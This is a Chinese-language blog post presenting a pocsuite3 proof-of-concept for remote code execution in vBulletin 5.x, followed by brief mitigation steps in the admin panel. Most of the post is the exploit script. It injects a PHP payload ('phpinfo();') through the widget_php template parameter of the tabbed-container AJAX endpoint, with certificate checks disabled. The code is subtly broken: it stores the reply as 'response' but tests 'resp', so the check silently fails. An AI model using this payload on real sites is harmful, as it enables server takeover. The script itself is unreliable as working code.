---
title:vBulletin 5.x RCE.py
categories: [dev]
comments: true
---

#### 参考链接：利用vBulletin：“补丁失败的故事”
> https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/


```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
from re import findall
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

class TestPOC(POCBase):
    vulID = ''
    version = '5.x'
    author = ['南方有梦']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['']
    name = 'vBulletin 5.x RCE'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = '''
    '''

    def _verify(self):
        result = {}
        target = '{u}/ajax/render/widget_tabbedcontainer_tab_panel'.format(u=self.url)
        data = "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();"
        try:
            response = requests.get(url=target, data=data, verify=False)
            if resp.status_code == 200 and 'PHP API' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except Exception as e:
            #print(e)
            logger.error(f"connect target '{self.url} failed!'")
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
```
### 漏洞检测脚本 Github地址：

> https://github.com/hackgov/article/blob/master/vBulletin%205.x%20RCE.py
>
> #### 基于POCsuite3框架运行


#### 修复建议
`此修补程序将禁用您论坛中的PHP小部件，并可能破坏某些功能，但在vBulletin发布补丁之前，将使您免受攻击。`

> 转到vBulletin管理员控制面板。
> 单击左侧菜单中的“设置”，然后单击下拉菜单中的“选项”。
> 选择“常规设置”，然后单击“编辑设置”
> 查找“禁用PHP，静态HTML和广告模块呈现”，设置为“是”，点击“保存”
> Godspeed和Happy DEFCON安全模式